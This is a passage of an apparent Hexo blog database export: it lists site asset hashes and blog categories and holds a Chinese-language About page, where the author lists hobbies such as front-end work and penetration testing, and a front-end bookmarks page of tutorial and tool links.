ash":"37d9e55a950a99dea274f5ae1c9127f28064fe6e","modified":1476555119800},{"_id":"public/2016/08/25/rpi-tmp-hdt-platform/index.html","hash":"22e5ddb6553266fb9d2a06fbbbfffcd452c1c366","modified":1476555119800},{"_id":"public/categories/docker/index.html","hash":"e925c57e3ef6fd120b770a10b7dee18915cd99e9","modified":1476555119833},{"_id":"public/tags/docker/index.html","hash":"21d2e430ddb8c1d593031961797b49e7792efa72","modified":1476555119833},{"_id":"public/CNAME","hash":"3caa31e8c80663f0f32301f20a9088e601a59116","modified":1476555119833},{"_id":"public/img/brand.jpg","hash":"ffba0231214d6103dba9bba0d9a5433366d539aa","modified":1476555119833},{"_id":"public/img/img-err.png","hash":"23a63ea26eb3c1d5e677d9883cf36cc1a1a1228b","modified":1476555119833},{"_id":"public/img/cc.png","hash":"ebce75a62b40976a72d43f0bd937d859ac24d87c","modified":1476555119833},{"_id":"public/img/img-loading.png","hash":"a9cd5cd11866824f31e3d1c5e23badfeb3f73031","modified":1476555119834},{"_id":"public/img/brand副本.jpg","hash":"0e237f1b433851c156e1f1cdaeb044054b3b9879","modified":1476555119835},{"_id":"public/img/logo.jpg","hash":"21df2e23a855eada5899bab1e09ad369ef83eaad","modified":1476555119835},{"_id":"public/content/images/chain/11.jpg","hash":"0ca3cc4ac9f9850d233d3813ba6b678a399f28dd","modified":1476555119836},{"_id":"public/content/images/chain/17.jpg","hash":"2ab06f9ab38ad7220e85d0211c9f6987728abe69","modified":1476555119836},{"_id":"public/content/images/chain/13.jpg","hash":"d6096a41b06b78e9fa48b40adf87874d3dc01a0f","modified":1476555119837},{"_id":"public/content/images/chain/12.jpg","hash":"1b719d7cb870911841f35840746082fa54164d04","modified":1476555119838},{"_id":"public/content/images/2016/07/----1-1.jpg","hash":"2d6916a4e453f4ed198b884548d5ef58f702dd31","modified":1476555119838},{"_id":"public/content/images/2016/07/c6d6a936c83a7e377bab2affeb9ace92.jpeg","hash":"97d2d8ec4f25eb44eb450125f1566e48d59e2155","modified":1476555119839},{"_id":"public/content/images/2016/07/----1.jpg","hash":"4b58a39ed8a379fbcb34b2577acc2de3c8c75d85","modified":1476555119839},{"_id":"public/content/images/2016/07/stock-photo-34414986.jpg","hash":"34464705169d0d2593a84369c5697ac0bace879c","modified":1476555119839},{"_id":"public/css/fonts/roboto/Roboto-Light.eot","hash":"42fe156996197e5eb0c0264c5d1bb3b4681f4595","modified":1476555119840},{"_id":"public/css/fonts/roboto/Roboto-Medium.eot","hash":"1517f4b6e1c5d0e5198f937557253aac8fab0416","modified":1476555119840},{"_id":"public/css/fonts/roboto/Roboto-Light.woff2","hash":"bbdc28b887400fcb340b504ec2904993af42a5d7","modified":1476555119840},{"_id":"public/css/fonts/roboto/Roboto-Bold.woff","hash":"ee99cd87a59a9a5d4092c83232bb3eec67547425","modified":1476555119841},{"_id":"public/css/fonts/roboto/Roboto-Light.woff","hash":"6300f659be9e834ab263efe2fb3c581d48b1e7b2","modified":1476555119841},{"_id":"public/css/fonts/roboto/Roboto-Regular.eot","hash":"77ae3e980ec03863ebe2587a8ef9ddfd06941db0","modified":1476555119841},{"_id":"public/css/fonts/roboto/Roboto-Medium.woff","hash":"d45f84922131364989ad6578c7a06b6b4fc22c34","modified":1476555119841},{"_id":"public/css/fonts/roboto/Roboto-Thin.eot","hash":"0790a51a848dbe7292c98f9d0459218bf1a8ffdd","modified":1476555119842},{"_id":"public/css/fonts/roboto/Roboto-Medium.woff2","hash":"6cc1b73571af9e827c4e7e91418f476703cd4c4b","modified":1476555119842},{"_id":"public/css/fonts/roboto/Roboto-Regular.woff","hash":"74734dde8d94e7268170f9b994dedfbdcb5b3a15","modified":1476555119842},{"_id":"public/css/fonts/roboto/Roboto-Thin.woff2","hash":"2449e3dac5ddb7c3da8bb07450493b62d052758c","modified":1476555119842},{"_id":"public/css/fonts/roboto/Roboto-Thin.woff","hash":"fbc3e71d456c96667d8082ab910e3946ef89240b","modified":1476555119842},{"_id":"public/css/fonts/roboto/Roboto-Regular.woff2","hash":"ed1558b0541f5e01ce48c7db1588371b990eec19","modified":1476555119842},{"_id":"public/css/fonts/roboto/Roboto-Bold.woff2","hash":"933b866d09c2b087707a98dab64b3888865eeb96","modified":1476555119842},{"_id":"public/css/fonts/roboto/Roboto-Bold.eot","hash":"a76cd602f5188b9fbd4ba7443dcb9c064e3dbf10","modified":1476555119843},{"_id":"public/content/images/chain/16.jpg","hash":"8b9bceb82096ec8f096d9038c66395975f803f61","modified":1476555119893},{"_id":"public/content/images/chain/2.jpg","hash":"298809c79fb3c46b630b6806b9699466b857beca","modified":1476555119893},{"_id":"public/content/images/chain/3.jpg","hash":"05531a249d9f6632053d85fc128cc967e1149a15","modified":1476555119893},{"_id":"public/content/images/chain/5.jpg","hash":"eeacdca516c1d493ac4f51592e706e7594280b8b","modified":1476555119893},{"_id":"public/content/images/chain/7.jpg","hash":"3b1403c632284ec243ea426b4184dba4446c73f8","modified":1476555119893},{"_id":"public/content/images/chain/4.jpg","hash":"c9189802c7cc8cff57e9a97e7d8d8a1e2a65be92","modified":1476555119893},{"_id":"public/content/images/chain/8.jpg","hash":"e3ca91e3963927ea7accad18cd24c67fdb3ae7d0","modified":1476555119893},{"_id":"public/content/images/chain/6.jpg","hash":"c23ee04262f20a5f76553706f709e65eea797dd5","modified":1476555119893},{"_id":"public/content/images/chain/1.jpg","hash":"048dae21c48202fd1854a85fc039759196fea482","modified":1476555119893},{"_id":"public/content/images/chain/15.jpg","hash":"4b958f425736b19451dd500f0edfb15dcc4b0aa4","modified":1476555119893},{"_id":"public/content/images/2016/07/1-2.png","hash":"319240599fbee752890dc663adda266ca0e7b634","modified":1476555119894},{"_id":"public/content/images/2016/07/1-5.png","hash":"153e555acd9900f7d03f59df6c6b8691574b1ef3","modified":1476555119894},{"_id":"public/content/images/2016/07/1-1.png","hash":"89f5df86de6ec8d8ed04f65b879f652f6d104311","modified":1476555119894},{"_id":"public/content/images/2016/07/2-2.png","hash":"99e3ded68d265ecd4d4daaa68e7e254b0e6148c2","modified":1476555119894},{"_id":"public/css/fonts/fontawesome/FontAwesome.otf","hash":"1b22f17fdc38070de50e6d1ab3a32da71aa2d819","modified":1476555119894},{"_id":"public/css/fonts/fontawesome/fontawesome-webfont.woff","hash":"6d7e6a5fc802b13694d8820fc0138037c0977d2e","modified":1476555119894},{"_id":"public/content/images/2016/08/LCD1602--.jpg","hash":"d4d0461ffa81bda1d69229434910ac3226d4f4bd","modified":1476555119894},{"_id":"public/css/fonts/fontawesome/fontawesome-webfont.eot","hash":"965ce8f688fedbeed504efd498bc9c1622d12362","modified":1476555119894},{"_id":"public/css/fonts/fontawesome/fontawesome-webfont.woff2","hash":"97e438cc545714309882fbceadbf344fcaddcec5","modified":1476555119894},{"_id":"public/css/fonts/roboto/Roboto-Light.ttf","hash":"e321c183e2b75ee19813892b7bac8d7c411cb88a","modified":1476555119894},{"_id":"public/css/fonts/roboto/Roboto-Bold.ttf","hash":"47327df0f35e7cd7c8645874897a7449697544ae","modified":1476555119894},{"_id":"public/css/fonts/roboto/Roboto-Medium.ttf","hash":"6060ca726b9760b76f7c347dce9d2fa1fe42ec92","modified":1476555119894},{"_id":"public/css/fonts/roboto/Roboto-Regular.ttf","hash":"824b5480c977a8166e177e5357d13164ccc45f47","modified":1476555119894},{"_id":"public/css/fonts/roboto/Roboto-Thin.ttf","hash":"173ed64528b4d010a76d8d38deb1d7e7eed58eda","modified":1476555119894},{"_id":"public/content/images/2016/08/wallhaven-275195.jpg","hash":"3bd439878a03f12bb405864b4d3625c274bdd7d1","modified":1476555119894},{"_id":"public/js/search.js","hash":"55f55e48d7080b69416bae449d6ab59d5af79695","modified":1476555119951},{"_id":"public/js/main.js","hash":"e8759aadea5da93cb01f006585266f221ecf9a89","modified":1476555119951},{"_id":"public/content/images/chain/14.jpg","hash":"d392baaddbe20e2cdd104b7fd263f8d121f36530","modified":1476555119951},{"_id":"public/content/images/chain/10.jpg","hash":"3070a49a34aad4ead41509078760fe3b9667dee5","modified":1476555119951},{"_id":"public/content/images/github/1lcd.jpg","hash":"3c580653f5d2f08b15ca3a9fa56cb36a8f383caf","modified":1476555119951},{"_id":"public/content/images/chain/9.jpg","hash":"892237d019f12be7ec7a6c4cde342226d0ceef79","modified":1476555119951},{"_id":"public/content/images/2016/07/1-4.png","hash":"a9432da1a589efa8e2e27db4ab0c72e605e1a4cb","modified":1476555119951},{"_id":"public/content/images/2016/07/1-3.png","hash":"60b98f49c3c85adf9779b0b78b778e511f4d5e9c","modified":1476555119951},{"_id":"public/content/images/2016/08/1.jpg","hash":"beeee63d8da466d2570a3a2f339004aba0d9437f","modified":1476555119951},{"_id":"public/content/images/2016/08/IMG_0459.JPG","hash":"08e757ae34c82e1216dc7bf0c8f3de314f83194c","modified":1476555119952},{"_id":"public/content/images/2016/08/IMG_0635.PNG","hash":"f280a423c9de794fbbfa91d70fc634ab2c1dae63","modified":1476555119966},{"_id":"public/content/images/2016/08/stock-photo-mr-ployly-108366231.jpg","hash":"2ed6823e9ff75f773ae54a57dfacd6f95fb458e7","modified":1476555119967},{"_id":"public/content/images/2016/08/wallhaven-131694.jpg","hash":"d2e44a7374138acd010aa108e34f29193a904765","modified":1476555119967},{"_id":"public/content/images/2016/08/wallhaven-131694-2.jpg","hash":"d7169f37b2f336a5bcfbe4ced2ebb9fd66ef251a","modified":1476555119967},{"_id":"public/content/images/2016/08/wallhaven-408428.jpg","hash":"1a10f789306272ea5acff4eacc69795986149862","modified":1476555119967},{"_id":"public/content/images/2016/08/wallhaven-392575-1.jpg","hash":"307459fe521206cd42016dbb89f0fe830cb33fbe","modified":1476555119968},{"_id":"public/css/fonts/fontawesome/fontawesome-webfont.ttf","hash":"61d8d967807ef12598d81582fa95b9f600c3ee01","modified":1476555119968},{"_id":"public/content/images/2016/08/stock-photo-mr-ployly-108366255.jpg","hash":"8b25f2ba44fde6ce111f8b124e4cda19bd84039b","modified":1476555119969},{"_id":"public/content/images/2016/08/wallhaven-131694-1.jpg","hash":"d2e44a7374138acd010aa108e34f29193a904765","modified":1476555119969},{"_id":"public/content/images/2016/08/DSC04069-1.JPG","hash":"61bbe63786ee24afe169ed6788647a13602360b5","modified":1476555119992},{"_id":"public/content/images/2016/08/DSC07326-2.JPG","hash":"99637a5369978d220ea33921a463b84e370571e2","modified":1476555119992},{"_id":"public/content/images/2016/08/DSC04069.JPG","hash":"61bbe63786ee24afe169ed6788647a13602360b5","modified":1476555119992},{"_id":"public/content/images/2016/08/GPIO.jpg","hash":"7c1d263b71671f8dc0ead71a4366f45a2a413e02","modified":1476555119992},{"_id":"public/content/images/2016/08/DSC07326-3.JPG","hash":"dc6c3f61e627176c55eea5d1bcf3c20276120daa","modified":1476555119992},{"_id":"public/content/images/2016/08/IMG_0502-1.JPG","hash":"c7e2a5cdc20221eaeb32832efbef29c5efed1784","modified":1476555119993},{"_id":"public/content/images/2016/08/WechatIMG293.jpeg","hash":"5825ef9bed7b65d92cae9cae817a9324fd2a8ad7","modified":1476555119994},{"_id":"public/content/images/2016/08/GPIO.png","hash":"a42a861d9e38e33ce1c530231b0667c921394aec","modified":1476555119994},{"_id":"public/content/images/2016/08/WechatIMG302.jpeg","hash":"df6490c06dd6fca9a2ad1fa41a7a0c894eaef532","modified":1476555119994},{"_id":"public/content/images/2016/08/wallhaven-125158.jpg","hash":"e75940c9f9cc3bed82a534801f9ea255afed4fcb","modified":1476555119995},{"_id":"public/content/images/2016/08/IMG_0798.JPG","hash":"00461ad1c77528376da12b5e9c1d95424dcdb407","modified":1476555119996},{"_id":"public/content/images/2016/08/wallhaven-392575.jpg","hash":"328a1c7e77d7aca0d058919c79d25c763e4f2e6e","modified":1476555119997},{"_id":"public/content/images/2016/08/wallhaven-291410.jpg","hash":"d154dc0b69388a582ef12e6ea5c538591fac25a4","modified":1476555119997},{"_id":"public/content/images/2016/08/wallhaven-291410-1.jpg","hash":"d154dc0b69388a582ef12e6ea5c538591fac25a4","modified":1476555120000},{"_id":"public/content/images/2016/08/DSC04031-1.JPG","hash":"e377908c1d88462310bf448824fd1ee55336bfa4","modified":1476555120036},{"_id":"public/content/images/2016/07/4-1.jpg","hash":"6fd7e626684c8abbd1a4f83f9186e149044cb7ab","modified":1476555120036},{"_id":"public/content/images/2016/08/DSC07326-1.JPG","hash":"03a9248549b2f797154263c26238a9f3b523e29b","modified":1476555120036},{"_id":"public/content/images/2016/08/DSC07326-4.JPG","hash":"065a2bb911e63f4766f69d9eba3525dabc5754e8","modified":1476555120036},{"_id":"public/content/images/2016/08/DSC07326-5.JPG","hash":"065a2bb911e63f4766f69d9eba3525dabc5754e8","modified":1476555120037},{"_id":"public/content/images/2016/08/DSC07326.JPG","hash":"03a9248549b2f797154263c26238a9f3b523e29b","modified":1476555120037},{"_id":"public/content/images/2016/08/IMG_1131.JPG","hash":"adaaac127524b6f86118fd05258b3b530247a4bb","modified":1476555120038},{"_id":"public/content/images/2016/08/IMG_0912.JPG","hash":"1b9cb4ab2981d39cf66b4e05305af72cdeeb60f8","modified":1476555120039},{"_id":"public/content/images/2016/08/IMG_0052.JPG","hash":"2d4d7697c2d3b8241d582e99ca7fd4182bb4fcf5","modified":1476555120039},{"_id":"public/content/images/2016/08/image.jpeg","hash":"c5b984715ee7f9616e954d097668db013a0ddf28","modified":1476555120039},{"_id":"public/content/images/2016/08/IMG_1133.JPG","hash":"08ca6b4eb0fbaf2540d48c619917b339f101a7e9","modified":1476555120040},{"_id":"public/content/images/2016/08/wallhaven-94129-1.jpg","hash":"744f58d22879482941f9271fef31385b2568f012","modified":1476555120040},{"_id":"public/content/images/2016/08/wallhaven-416679-1.jpg","hash":"9166c465a0547b9f7edd93f365f854260d2a46e5","modified":1476555120041},{"_id":"public/content/images/2016/08/DSC04031.JPG","hash":"e377908c1d88462310bf448824fd1ee55336bfa4","modified":1476555120042},{"_id":"public/content/images/wechat/1.jpg","hash":"bc9a095a259c83cbfe8cae4c965248345dd5858c","modified":1476555120063},{"_id":"public/content/images/2016/07/1-2.jpg","hash":"7e4b4312437dd2a2e2c299d3079eac25397195b3","modified":1476555120064},{"_id":"public/content/images/2016/07/1-1.jpg","hash":"7e4b4312437dd2a2e2c299d3079eac25397195b3","modified":1476555120064},{"_id":"public/content/images/2016/08/IMG_0310-1.JPG","hash":"f39c5bb41935fe911e4cc96f94fe56df45d96df0","modified":1476555120065},{"_id":"public/css/fonts/fontawesome/fontawesome-webfont.svg","hash":"c0522272bbaef2acb3d341912754d6ea2d0ecfc0","modified":1476555120065},{"_id":"public/content/images/wechat/3.jpg","hash":"2862ffbdab93a35734597ea7e1c0fcd0cf4c653b","modified":1476555120066},{"_id":"public/content/images/github/1version.jpg","hash":"27e19cc3985f0e5774b76691ae68c94eec41469c","modified":1476555120091},{"_id":"public/content/images/2016/07/2.jpg","hash":"c5dc6807dc66bace55dd230c7345d8c7f9e18c09","modified":1476555120091},{"_id":"public/content/images/2016/08/WechatIMG10.jpeg","hash":"8848406df7412ace37288f20e02d7570e8ac7b3a","modified":1476555120091},{"_id":"public/content/images/2016/08/wallhaven-416679.jpg","hash":"bf71d3cc94b24efcdcb35d4369db63514d3bb86c","modified":1476555120091},{"_id":"public/content/images/2016/08/wallhaven-94129-2.jpg","hash":"fe749ae41441bedc997c8d65cdbcc253fdbda30b","modified":1476555120091},{"_id":"public/content/images/2016/08/wallhaven-94129.jpg","hash":"03d0ce91743f5b67353f2099a686a5ec0918589d","modified":1476555120092},{"_id":"public/content/images/2016/07/1.jpg","hash":"c84cf78cb9f80cfb80889876341aed8fa2f4b80c","modified":1476555120104},{"_id":"public/content/images/2016/07/5-pic_hd.jpg","hash":"9a745fd70c96cb40743712158525c3e53933e374","modified":1476555120104},{"_id":"public/content/images/2016/07/2-1.png","hash":"6897845f3e8afbf1f7dfa342de852d427d6f83a2","modified":1476555120395},{"_id":"public/css/style.css","hash":"6a9925e3bdf2c95563beeb7581e27fffe955a8ed","modified":1476555120401},{"_id":"public/content/images/wechat/2.jpg","hash":"f9eeef6ff4792961fb23fb40eb31f64f1345d473","modified":1476555120401},{"_id":"public/content/images/2016/07/8-pic_hd.jpg","hash":"d17c7cc223c2d1254d4a737a8244f7d5bd148594","modified":1476555120409},{"_id":"public/content/images/2016/07/stock-photo-132346157-1.jpg","hash":"3f7b35da05274615e9c43dc00c5f45978b4b82ad","modified":1476555120413},{"_id":"public/content/images/2016/07/stock-photo-132346157.jpg","hash":"3f7b35da05274615e9c43dc00c5f45978b4b82ad","modified":1476555120413},{"_id":"public/content/images/2016/07/6-pic_hd.jpg","hash":"a8ff095c62e6cd2e57a91ec881ec4d25b863b37b","modified":1476555120414},{"_id":"public/content/images/2016/07/7-pic_hd.jpg","hash":"59414eb00217b9ab287c2b22e99a4b421473b641","modified":1476555120421},{"_id":"public/content/images/2016/07/1-pic_hd.jpg","hash":"99aed5231a97f5dec6f2e9ce021093a1526c54d3","modified":1476555120427},{"_id":"public/content/images/2016/07/9-pic_hd.jpg","hash":"ffcfed03a9232be2eec3b3ef04f05d8ab3c0e5d7","modified":1476555120433},{"_id":"public/content/images/2016/07/QQ20160729-0-2x.png","hash":"87a86e333dd0cf0fc443c26a951d4f81ef94a2bf","modified":1476555120438},{"_id":"public/content/images/2016/07/3-pic_hd.jpg","hash":"a5b7063f85f03cfe7ad2415839f6bf983aed1aa6","modified":1476555120441},{"_id":"public/content/images/2016/08/IMG_0502.JPG","hash":"053255b8b2c97a07a3c878f2199708f18606c34d","modified":1476555120448},{"_id":"public/content/images/2016/08/IMG_0310.JPG","hash":"5a2c3d2ca47eee4b080c2622791c0a34d9e3962e","modified":1476555120455},{"_id":"public/content/images/2016/07/05b2ca554a02c900000115a8e67804-1.jpg","hash":"44abc290aa6bf5dbb36d96e5f2472228b9d70766","modified":1476555120472},{"_id":"public/content/images/2016/07/05b2ca554a02c900000115a8e67804.jpg","hash":"44abc290aa6bf5dbb36d96e5f2472228b9d70766","modified":1476555120472},{"_id":"public/content/images/2016/07/----.jpg","hash":"fef2e98d8cefbc85f60db377b3a7bd805716f805","modified":1476555120489}],"Category":[{"name":"docker","_id":"ciubisk9700063sonhc3mnmwz"},{"name":"Web","_id":"ciubisk9l000b3songvr94v5s"},{"name":"Java","_id":"ciubisk9z000h3soncaixc7od"},{"name":"Mac","_id":"ciubiska4000n3son1mlkdx27"},{"name":"Sql","_id":"ciubiskab000u3sonylnec1vl"},{"name":"Hack","_id":"ciubiskaj00113sonnqx2ofoy"},{"name":"Linux","_id":"ciubiskb1001i3sonu642y4i7"},{"name":"笑话","_id":"ciubiskbi001q3son7f150bro"}],"Data":[],"Page":[{"title":"关于","id":8,"date":"2016-09-25T23:27:35.000Z","_content":"# 关于我\n\n** 一凡，Ivan **\n\n本科 自动化 研究生 计算机科学技术\n\nUniversity of Birmingham\n\n# 生活方式\n\n* 爱好Web前端，2006年至今\n* 爱好渗透测试，2007年至今\n* 和前端相关的美工，但渣\n* 从来不用收藏夹，一直背网址\n* TAB档，除了用python的时候\n* github的star各种人的狂魔\n* Cnbeta党，一刻不停的刷cb，一刷刷了10年\n* Mac党，中度果粉\n* Chrome党，谷歌第二信仰\n* 知乎狂魔，关注我\n* 曾经的OIer，算法小渣渣\n* 懂各种程序员的梗，励志当程序员段子手\n* 爱做饭爱蹭饭\n\n# 联系方式\n\n* 微信：yifani\n* 邮件：yifanb@gmail.com （接受邮件，一直会回复）\n* 知乎：[点击进入...](https://www.zhihu.com/people/yfgeek)\n\n# 友情链接\n* [Fuxiaohei](http://fuxiaohei.me/)\n* [Wayne Yan](http://www.oursays.com)\n* [Echowxsy](http://echowxsy.com/)\n* [Plus Xuan Lee](http://lirujia.github.io/)\n","source":"about/index.md","raw":"---\ntitle: 关于\npermalink: about\nid: 8\ndate: 2016-09-26 00:27:35\n---\n# 关于我\n\n** 一凡，Ivan **\n\n本科 自动化 研究生 计算机科学技术\n\nUniversity of Birmingham\n\n# 生活方式\n\n* 爱好Web前端，2006年至今\n* 爱好渗透测试，2007年至今\n* 和前端相关的美工，但渣\n* 从来不用收藏夹，一直背网址\n* TAB档，除了用python的时候\n* github的star各种人的狂魔\n* Cnbeta党，一刻不停的刷cb，一刷刷了10年\n* Mac党，中度果粉\n* Chrome党，谷歌第二信仰\n* 知乎狂魔，关注我\n* 曾经的OIer，算法小渣渣\n* 懂各种程序员的梗，励志当程序员段子手\n* 爱做饭爱蹭饭\n\n# 联系方式\n\n* 微信：yifani\n* 邮件：yifanb@gmail.com （接受邮件，一直会回复）\n* 知乎：[点击进入...](https://www.zhihu.com/people/yfgeek)\n\n# 友情链接\n* [Fuxiaohei](http://fuxiaohei.me/)\n* [Wayne Yan](http://www.oursays.com)\n* [Echowxsy](http://echowxsy.com/)\n* [Plus Xuan Lee](http://lirujia.github.io/)\n","updated":"2016-09-29T16:54:24.000Z","path":"about.html","comments":1,"layout":"page","_id":"ciubisk8t00013son5ys0yto0","content":"<h1 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h1><p><strong> 一凡，Ivan </strong></p>\n<p>本科 自动化 研究生 计算机科学技术</p>\n<p>University of Birmingham</p>\n<h1 id=\"生活方式\"><a href=\"#生活方式\" class=\"headerlink\" title=\"生活方式\"></a>生活方式</h1><ul>\n<li>爱好Web前端，2006年至今</li>\n<li>爱好渗透测试，2007年至今</li>\n<li>和前端相关的美工，但渣</li>\n<li>从来不用收藏夹，一直背网址</li>\n<li>TAB档，除了用python的时候</li>\n<li>github的star各种人的狂魔</li>\n<li>Cnbeta党，一刻不停的刷cb，一刷刷了10年</li>\n<li>Mac党，中度果粉</li>\n<li>Chrome党，谷歌第二信仰</li>\n<li>知乎狂魔，关注我</li>\n<li>曾经的OIer，算法小渣渣</li>\n<li>懂各种程序员的梗，励志当程序员段子手</li>\n<li>爱做饭爱蹭饭</li>\n</ul>\n<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><ul>\n<li>微信：yifani</li>\n<li>邮件：yifanb@gmail.com （接受邮件，一直会回复）</li>\n<li>知乎：<a href=\"https://www.zhihu.com/people/yfgeek\" target=\"_blank\" rel=\"external\">点击进入…</a></li>\n</ul>\n<h1 id=\"友情链接\"><a href=\"#友情链接\" class=\"headerlink\" title=\"友情链接\"></a>友情链接</h1><ul>\n<li><a href=\"http://fuxiaohei.me/\" target=\"_blank\" rel=\"external\">Fuxiaohei</a></li>\n<li><a href=\"http://www.oursays.com\" target=\"_blank\" rel=\"external\">Wayne Yan</a></li>\n<li><a href=\"http://echowxsy.com/\" target=\"_blank\" rel=\"external\">Echowxsy</a></li>\n<li><a href=\"http://lirujia.github.io/\" target=\"_blank\" rel=\"external\">Plus Xuan Lee</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h1><p><strong> 一凡，Ivan </strong></p>\n<p>本科 自动化 研究生 计算机科学技术</p>\n<p>University of Birmingham</p>\n<h1 id=\"生活方式\"><a href=\"#生活方式\" class=\"headerlink\" title=\"生活方式\"></a>生活方式</h1><ul>\n<li>爱好Web前端，2006年至今</li>\n<li>爱好渗透测试，2007年至今</li>\n<li>和前端相关的美工，但渣</li>\n<li>从来不用收藏夹，一直背网址</li>\n<li>TAB档，除了用python的时候</li>\n<li>github的star各种人的狂魔</li>\n<li>Cnbeta党，一刻不停的刷cb，一刷刷了10年</li>\n<li>Mac党，中度果粉</li>\n<li>Chrome党，谷歌第二信仰</li>\n<li>知乎狂魔，关注我</li>\n<li>曾经的OIer，算法小渣渣</li>\n<li>懂各种程序员的梗，励志当程序员段子手</li>\n<li>爱做饭爱蹭饭</li>\n</ul>\n<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><ul>\n<li>微信：yifani</li>\n<li>邮件：yifanb@gmail.com （接受邮件，一直会回复）</li>\n<li>知乎：<a href=\"https://www.zhihu.com/people/yfgeek\">点击进入…</a></li>\n</ul>\n<h1 id=\"友情链接\"><a href=\"#友情链接\" class=\"headerlink\" title=\"友情链接\"></a>友情链接</h1><ul>\n<li><a href=\"http://fuxiaohei.me/\">Fuxiaohei</a></li>\n<li><a href=\"http://www.oursays.com\">Wayne Yan</a></li>\n<li><a href=\"http://echowxsy.com/\">Echowxsy</a></li>\n<li><a href=\"http://lirujia.github.io/\">Plus Xuan Lee</a></li>\n</ul>\n"},{"title":"前端收藏夹","id":7,"updated":"2016-08-17T18:53:28.000Z","date":"2016-07-30T23:27:35.000Z","_content":"\n这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。\n\n# 网站\n* [Github热度排名](https://www.awesomes.cn/)\n* [imweb前端社区](http://imweb.io/)\n* [鑫空间](http://www.zhangxinxu.com/wordpress/)\n* [AlloyTeam](http://www.alloyteam.com/)\n\n# Github\n* [PDF.JS 加载pdf](http://mozilla.github.io/pdf.js)\n\n# 娱乐\n* [前端 JSer 装逼手册](https://segmentfault.com/a/1190000005987011)\n\n# 工具\n* [工具武装的前端开发工程师](https://github.com/jaywcjlove/awesome-mac)\n* [Vim 初探](http://imweb.io/topic/579deaee93d9938132cc8d88)\n* [[译] 使用 Zopfli 优化 PNG 图片](https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md)\n* [在Mac平台配置你的开发环境](http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&mid=2652201857&idx=1&sn=803e04a8304c127aaa0bb7770f8add1d&scene=0#wechat_redirect)\n* [前端工具箱chrome插件](https://github.com/Pearyman/chrome_plugin)\n\n# 模板素材\n* [easyicon](http://www.easyicon.net/)\n* [稀土区](https://xituqu.com/)\n* [优设](http://www.uisdc.com/)\n* [500px](https://marketplace.500px.com/)\n* [壁纸wallhaven](https://alpha.wallhaven.cc/)\n* [jquery](http://www.htmleaf.com/)\n\n# 模板\n* [HTML5 UP](https://html5up.net/)\n* [控制面板](https://www.awesomes.cn/subject/admins)\n\n# 文档\n* [Hexo](https://hexo.io/zh-cn/docs/)\n\n# 文章\n* [通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算](https://zhuanlan.zhihu.com/p/21650547)\n* [如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你](https://zhuanlan.zhihu.com/p/21490434)\n* [前端面试大全](https://segmentfault.com/a/1190000005947094)\n* [前端跨域及其解决方案](http://tech.jandou.com/cross-domain.html)\n* [30分钟git命令入门到放弃](http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/)\n* [(Canvas) 前端如何呼风唤雨](http://imweb.io/topic/55e32fd5771670e207a16bb9)\n* [如何构建一支专业的前端开发团队（一）\n](https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)\n* [Nodejs学习日志（一）——cheerio爬虫](http://molunerfinn.com/nodejs-1/)\n* [如何打造一个令人愉悦的前端开发环境（一）](https://segmentfault.com/a/1190000006157372)\n* [如何让你的网页打开速度降低到1s内](http://www.jianshu.com/p/d857c3ff78d6)","source":"fav/index.md","raw":"---\ntitle: 前端收藏夹\npermalink: fav\nid: 7\nupdated: '2016-08-17 19:53:28'\ndate: 2016-07-31 00:27:35\n---\n\n这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。\n\n# 网站\n* [Github热度排名](https://www.awesomes.cn/)\n* [imweb前端社区](http://imweb.io/)\n* [鑫空间](http://www.zhangxinxu.com/wordpress/)\n* [AlloyTeam](http://www.alloyteam.com/)\n\n# Github\n* [PDF.JS 加载pdf](http://mozilla.github.io/pdf.js)\n\n# 娱乐\n* [前端 JSer 装逼手册](https://segmentfault.com/a/1190000005987011)\n\n# 工具\n* [工具武装的前端开发工程师](https://github.com/jaywcjlove/awesome-mac)\n* [Vim 初探](http://imweb.io/topic/579deaee93d9938132cc8d88)\n* [[译] 使用 Zopfli 优化 PNG 图片](https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md)\n* [在Mac平台配置你的开发环境](http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&mid=2652201857&idx=1&sn=803e04a8304c127aaa0bb7770f8add1d&scene=0#wechat_redirect)\n* [前端工具箱chrome插件](https://github.com/Pearyman/chrome_plugin)\n\n# 模板素材\n* [easyicon](http://www.easyicon.net/)\n* [稀土区](https://xituqu.com/)\n* [优设](http://www.uisdc.com/)\n* [500px](https://marketplace.500px.com/)\n* [壁纸wallhaven](https://alpha.wallhaven.cc/)\n* [jquery](http://www.htmleaf.com/)\n\n# 模板\n* [HTML5 UP](https://html5up.net/)\n* [控制面板](https://www.awesomes.cn/subject/admins)\n\n# 文档\n* [Hexo](https://hexo.io/zh-cn/docs/)\n\n# 文章\n* [通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算](https://zhuanlan.zhihu.com/p/21650547)\n* [如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你](https://zhuanlan.zhihu.com/p/21490434)\n* [前端面试大全](https://segmentfault.com/a/1190000005947094)\n* [前端跨域及其解决方案](http://tech.jandou.com/cross-domain.html)\n* [30分钟git命令入门到放弃](http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/)\n* [(Canvas) 前端如何呼风唤雨](http://imweb.io/topic/55e32fd5771670e207a16bb9)\n* [如何构建一支专业的前端开发团队（一）\n](https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)\n* 